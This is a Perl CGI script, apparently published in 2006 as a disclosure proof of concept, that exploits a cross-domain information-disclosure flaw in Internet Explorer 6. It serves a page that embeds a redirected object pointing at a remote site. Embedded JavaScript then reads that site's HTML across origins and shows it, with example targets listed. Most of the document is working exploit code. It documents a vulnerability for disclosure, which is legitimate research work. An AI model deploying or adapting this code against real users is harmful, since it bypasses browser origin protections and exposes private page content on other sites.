#!/usr/bin/perl --

# CGI script '/ub/psz/outerHTML', running under Apache.
# For testing purposes only.

$| = 1;

$cmd = $ENV{'SCRIPT_NAME'};	# Could use $0

#  Should send 'Status: 200 OK' ...
#  HTTP header, blank line, HTML body
#  Should send Content-Length ...
$HEAD = "Content-type: text/html\n";

$BODY = "
<html>
<head>
<title>$cmd</title>
</head>
<body bgcolor=white>
<p>PoC for cross-domain access: read the contents of 'remote' webpages.
Tested on IE6/WinXPSP2.
<p>This PoC attack works somewhat un-reliably. It may help to go to IE
Tools, InternetOptions, and delete everything in TemporaryInternetFiles.
<br>Does not seem to work with web proxies, seems to work pnly with
'direct connection to internet'.
<p>Seems to only succeed on pages that use the 'Cache-Control:&nbsp;private'
header: www.google.com and few others (keep googling for more).
<br>Rather useless if it only works on a small number of websites.
<p>When this PoC attack works, the browser is confused as to the origin
of the page: relative links (e.g. the google image) show www.maths
(and do not work). The bug is not in outerHTML: we use innerHTML.
<p>
";

for (1..1) {	# In a loop so we can quit with last

# Only care about GET (no need for POST)
$QUERY = &sanitize( $ENV{'QUERY_STRING'} );

if ($QUERY eq 'source') {
    open (F, "<$0") or &error ("Cannot open $0"), last;
    $BODY .= "<h1>PoC source</h1>\n<pre>";
    while (<F>) {
	$BODY .= &sanitize($_);
    }
    close F;
    $BODY .= "</pre>";
}
#elsif ( ($x) = $QUERY =~ m/^o/) {
#	$HEAD .= "Cache-Control: private\n";
#	$BODY = '<html><body>hello</body></html>';
#	print $HEAD, "\n", $BODY;
#	exit;
#}
elsif ( ($x) = $QUERY =~ m/^r=(.*)$/) {
    $x =~ m!^https?://! or $x =~ s!^!http://!;

# Logs show two accesses:
#GET /ub/psz/outerHTML?q=www.google.com HTTP/1.0 200 2661 "http://www.maths.usyd.edu.au/ub/psz/outerHTML"
#GET /ub/psz/outerHTML?r=www.google.com HTTP/1.0 302 - "http://www.maths.usyd.edu.au/ub/psz/outerHTML?q=www.google.com"
#GET /ub/psz/outerHTML?r=www.google.com HTTP/1.0 302 - "-"
# Once to see what type that object is, then again to actually display it?
#    if ( $ENV{'HTTP_REFERER'} =~ m/$cmd/ ) {
#	# For some reason IE makes two accesses, this is the first.
#	# It does not seem to matter much what we return this first time...
#	# but then the exploit does not work, even if it is a redirect to
#	# a destination with 'Cache-Control: private' ...
#	$x = "$cmd?o";
#    }

    ## Cannot use JS redirect (showing we need active/CGI pages):
    #$BODY .= "<script>document.location.href = '$x'</script>\n";
    ## Could use:
    #$HEAD .= "Location: $x\n";
    #$BODY .= "<p>Moved to <a href=\"$x\">here</a>\n";
    ## Should test whether could use:
    #$BODY = "<html><head>
    #<meta http-equiv=\"refresh\" content=\"0;url=$x\">
    #</head><body>Redirecting to $x, please wait...";
    print "Status: 302 Found\nCache-Control: private\nLocation: $x\nContent-Type: text/html\n\n";
    exit;
}
elsif ( ($x) = $QUERY =~ m/^q=(.*)$/) {
    $BODY .= "
<h1>PoC</h1>
<script>
var stop=0
var loop=0
var retr=0
function retrieve (x) {
    if (stop) {
      r.innerText = 'Stop (after ' + loop + ' tries), cannot retrieve: not vulnerable'
      return
    }
    loop++;
//  try       { retr = o.object.documentElement.outerHTML }
    try       { retr = o.object.documentElement.innerHTML }
    catch (e) { r.innerText = 'Cannot retrieve ' + e + ': not vulnerable (try ' + loop + ')' }
    if (retr.length > 300) {
      r.innerText = '(length ' + retr.length + ', try ' + loop + \")\\n\" + retr
      return
    }
    setTimeout('retrieve()',1)
}
setTimeout('stop=1;',5000)
setTimeout('retrieve()',10)
</script>
<p>Redirected object $x (should show always):<p>
<object
 width=640 height=300
 data=\"$cmd?r=$x\"
 type=text/html id=o></object>
<p>Recovered object (success means vulnerable):<p>
<textarea cols=80 rows=15 id=r>Retrieving ...</textarea>
    ";
#function retrieve (x) {
#  try       { r.innerText = o.object.documentElement.outerHTML }
#  catch (e) { r.innerText = 'Cannot retrieve ' + e + ': not vulnerable' }
#}
#setTimeout('retrieve()',1000)

}
else {
    $QUERY or &error(), last;
    &error("Bad query $QUERY");
}

last;
}

#  Signature
$BODY .= "<p>
<pre>
See also:
  <a href=\"http://lists.grok.org.uk/pipermail/full-disclosure/2006-June/047398.html\">http://lists.grok.org.uk/pipermail/full-disclosure/2006-June/047398.html</a>
  <a href=\"http://secunia.com/advisories/20825/\">http://secunia.com/advisories/20825/</a>
  <a href=\"http://secunia.com/internet_explorer_information_disclosure_vulnerability_test/\">http://secunia.com/internet_explorer_information_disclosure_vulnerability_test/</a>
  <a href=\"http://isc.sans.org/diary.php?storyid=1448\">http://isc.sans.org/diary.php?storyid=1448</a>
</pre>
<hr size=1>
<a href=\"$cmd\">$cmd</a>: Proof-of-Concept
<br>
<a href=\"http://www.maths.usyd.edu.au/u/psz/\"><b>Paul Szabo</b></a>
<a href=\"mailto:psz\@maths.usyd.edu.au\">psz\@maths.usyd.edu.au</a>
10 Jul 06
</body>
</html>
";

print $HEAD, "\n", $BODY;

exit;


##

sub error {
    #  Report a fatal error
    $BODY .= "\n<h1>Error</h1>\n@_\n<p>\n" if @_;
    $BODY .= "\n<h1>Usage</h1><pre>
<a href=\"$cmd?source\">$cmd?source</a> 	  to show perl source code
$cmd?q=site	      to grab content of site (with or witout http://) e.g.
  <a href=\"$cmd?q=www.google.com\">$cmd?q=www.google.com</a>
  <a href=\"$cmd?q=www.openbc.com\">$cmd?q=www.openbc.com</a>
  <a href=\"$cmd?q=forum.worldwindcentral.com\">$cmd?q=forum.worldwindcentral.com</a>
  <a href=\"$cmd?q=www.aspfaq.com\">$cmd?q=www.aspfaq.com</a>
</pre><p>\n";
}

sub sanitize {
    my ($s) = @_;
    $s =~ s/\&/\&amp;/g;
    $s =~ s/\</\&lt;/g;
    $s =~ s/\>/\&gt;/g;
    return $s;
}

#!#
